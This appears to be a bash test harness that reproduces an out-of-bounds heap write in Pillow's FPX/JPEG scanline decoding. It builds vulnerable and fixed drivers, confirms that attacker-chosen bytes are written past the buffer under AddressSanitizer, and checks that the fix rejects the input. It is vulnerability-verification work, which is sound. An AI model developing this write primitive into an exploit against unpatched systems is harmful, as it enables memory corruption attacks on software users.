#!/usr/bin/env bash
# Source-bound Pillow FPX/JPEG scanline OOB-write harness.
# Inputs are local argv values standing in for an FPX tile's rawmode "LA"
# (2 bytes/pixel) and an embedded 4-component JPEG with an attacker value.
# No FPX file, Pillow build, socket or external system is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
  else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed; do
  gcc -std=c11 -O0 -g -o "$OUT/$t" "driver_$t.c" -ljpeg || exit 2
  gcc -std=c11 -O0 -g -fsanitize=address -fno-omit-frame-pointer \
    -o "$OUT/${t}_asan" "driver_$t.c" -ljpeg || exit 2
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"

r1=$($V raw 64 32 0x5a); echo "$r1"
check "rung1 4-component row exceeds 2-byte tile buffer" \
  "$(contains 'rv=1 limit=64 staged=256' "$r1" && contains 'stag0=5a' "$r1" && echo 1 || echo 0)"

r2=$($V read 64 32 0x5a); echo "$r2"
check "rung2 chosen bytes read back past 64-byte buffer" \
  "$(yes 'rv=1 limit=64 staged=256 oob0=5a oob16=5a oob32=5a oob48=5a' "$r2")"

rv=$($V read 64 32 0xa5); echo "$rv"
check "chosen value 0xa5, not a fixed marker" \
  "$(yes 'oob0=a5 oob16=a5 oob32=a5 oob48=a5' "$rv")"

"$VA" exact 64 32 0x5a > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 256' "$ac" &&
contains 'pillow_row_copy' "$ac" &&
contains 'JpegDecode_v12.2.0.c:252' "$ac" && ok=1
check "rung3 ASan write from pinned :252 scanline" "$ok"

ok=1
for tile in 16 32 48; do
  ro=$($V read $((2*tile)) "$tile" 0x5a); echo "$ro"
  contains "limit=$((2*tile))" "$ro" &&
  contains 'oob0=5a oob16=5a oob32=5a oob48=5a' "$ro" || ok=0
done
check "rung4 chosen 0x5a at offsets 0/16/32/48 for three tile limits" "$ok"

( "$V" guard 64 32 0x5a > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page faults on first past-end byte" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

fc=$($F read 64 32 0x5a); echo "$fc"
check "fixed 13.0.0 guard rejects before the write" \
  "$(yes 'rv=-1 limit=64 staged=0 oob0=--' "$fc")"

fi=$($F inbounds 32 64 0x41); echo "$fi"
check "fixed accepts a scanline that fits the buffer" \
  "$(yes 'rv=1 limit=128 staged=128 last=41' "$fi")"

"$VA" inbounds 32 64 0x41 > "$OUT/vuln_benign_asan.log" 2>&1; a=$?
"$FA" exact 64 32 0x5a > "$OUT/fixed_bad_asan.log" 2>&1; b=$?
"$FA" inbounds 32 64 0x41 > "$OUT/fixed_good_asan.log" 2>&1; c=$?
ok=0
[ "$a" -eq 0 ] && [ "$b" -eq 0 ] && [ "$c" -eq 0 ] &&
! contains 'AddressSanitizer' "$(cat "$OUT/vuln_benign_asan.log")" &&
! contains 'AddressSanitizer' "$(cat "$OUT/fixed_bad_asan.log")" &&
! contains 'AddressSanitizer' "$(cat "$OUT/fixed_good_asan.log")" && ok=1
check "ASan clean: vulnerable benign, fixed hostile+benign" "$ok"

group() {
  for i in 1 2 3 4 5; do
    "$V" raw 64 32 0x5a; "$V" read 64 32 0x5a; "$V" read 64 32 0xa5
    "$V" read 32 16 0x5a; "$F" read 64 32 0x5a; "$V" inbounds 32 64 0x41
  done | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
